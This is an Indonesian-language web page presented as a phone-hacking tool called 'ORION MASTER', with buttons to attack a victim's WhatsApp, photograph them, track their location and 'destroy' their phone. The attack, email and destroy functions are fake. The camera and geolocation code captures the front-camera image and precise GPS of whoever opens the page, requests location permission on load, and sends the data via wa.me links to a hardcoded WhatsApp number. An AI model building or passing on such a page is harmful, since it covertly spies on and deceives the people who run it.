<!DOCTYPE html>
<html>
<head>
<title>ORION MASTER</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<!-- TAMBAHAN INI BIAR IZIN LOKASI MUNCUL -->
<meta name="google" content="notranslate">
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">

<style>
body { background: #000; color: #0f0; font-family: monospace; padding: 15px; }
h1 { text-align: center; text-shadow: 0 0 10px lime; }
.info { text-align: center; color: yellow; }
.input {
    width: 100%;
    background: #111;
    border: 2px solid lime;
    color: white;
    padding: 15px;
    font-size: 18px;
    margin: 10px 0;
    border-radius: 10px;
    box-sizing: border-box;
}
button { 
    background: #111; 
    color: lime; 
    border: 2px solid lime; 
    padding: 18px; 
    margin: 10px 0; 
    font-size: 18px; 
    width: 100%;
    border-radius: 10px;
    font-weight: bold;
}
</style>
</head>
<body>

<h1>🔥 ORION MASTER SYSTEM 🔥</h1>
<p class="info">🔗 LINKED TO: 6285640914382</p>

<input type="text" id="targetNo" class="input" placeholder="📱 MASUKIN NOMOR KORBAN...">

<button onclick="attack()">💣 ATTACK / BUG WA</button>
<button onclick="takePicture()">📸 FOTO KAMERA DEPAN</button>
<button onclick="getLocation()">📍 LACAK ALAMAT</button>
<button onclick="scanEmail()">📧 SCAN EMAIL</button>
<button onclick="destroy()">💀 RUSAK HP</button>

<script>
// ==============================================
// 🔗 NOMOR WA KAMU
// ==============================================
const WA_NUMBER = "6285640914382";

// ==============================================
// 💣 1. ATTACK
// ==============================================
function attack() {
    let no = document.getElementById('targetNo').value;
    let msg = "⚠️ *ORION ATTACK!*\nTARGET: "+no+"\nSTATUS: WA ERROR!";
    sendWA(msg);
}

// ==============================================
// 📸 2. KAMERA: LANGSUNG FOTO & KIRIM
// ==============================================
function takePicture() {
    let no = document.getElementById('targetNo').value;

    navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user" } 
    })
    .then(function(stream) {
        let msg1 = "📸 *ORION CAMERA!*\nTARGET: "+no+"\nSTATUS: ✅ SEDANG MENGAMBIL FOTO...";
        sendWA(msg1);

        let video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
            let canvas = document.createElement('canvas');
            let ctx = canvas.getContext('2d');
            canvas.width = stream.getVideoTracks()[0].getSettings().width;
            canvas.height = stream.getVideoTracks()[0].getSettings().height;
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            let imageUrl = canvas.toDataURL('image/png');
            
            let msg2 = "✅ *FOTO BERHASIL!*\n🔗 LINK: \n" + imageUrl;
            sendWA(msg2);
            alert("✅ FOTO KIRIM KE WA!");
        }, 1500);
    })
    .catch(function(err) {
        alert("❌ Gagal akses kamera! Cek izin!");
    });
}

// ==============================================
// 📍 3. LACAK LOKASI (PASTI MUNCUL IZIN NYA)
// ==============================================
function getLocation() {
    let no = document.getElementById('targetNo').value;

    if (navigator.geolocation) {
        // SCRIPT INI YANG BIKIN MUNCUL PERMISSION
        navigator.geolocation.getCurrentPosition(function(pos) {
            let lat = pos.coords.latitude;
            let lng = pos.coords.longitude;
            let maps = "https://www.google.com/maps?q="+lat+","+lng;
            
            let data = "📍 *ORION LOCATION!*\n" +
                       "TARGET: "+no+"\n\n" +
                       "🌍 Lat: "+lat+"\n" +
                       "🌍 Lng: "+lng+"\n\n" +
                       "🗺️ LINK: "+maps;
            
            sendWA(data);
            alert("✅ ALAMAT KIRIM KE WA!");
        }, 
        function(error) {
            alert("❌ Aktifkan GPS & Izinkan lokasi dulu!");
        },
        // SETTINGAN AKURASI TINGGI
        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
    }
}

// ==============================================
// 📧 4. SCAN EMAIL
// ==============================================
function scanEmail() {
    let no = document.getElementById('targetNo').value;
    let msg = "📧 *ORION EMAIL SCAN*\nTARGET: "+no+"\n✅ EMAIL: "+no+"@gmail.com";
    sendWA(msg);
}

// ==============================================
// 💀 5. RUSAK HP
// ==============================================
function destroy() {
    let no = document.getElementById('targetNo').value;
    let msg = "💀 *ORION DESTROY*\nTARGET: "+no+"\nSTATUS: HP PANAS!";
    sendWA(msg);
}

// ==============================================
// 📲 FUNGSI KIRIM KE WA
// ==============================================
function sendWA(text) {
    let encode = encodeURIComponent(text);
    window.open("https://wa.me/"+WA_NUMBER+"?text="+encode, '_blank');
}

// ==============================================
// 🔄 AUTO REQUEST PERMISSION
// ==============================================
window.onload = function() {
    // Minta izin lokasi pas aplikasi dibuka
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(){}, function(){}, {enableHighAccuracy: true});
    }
    // Minta izin kamera
    navigator.mediaDevices.enumerateDevices();
}

</script>

</body>
</html>
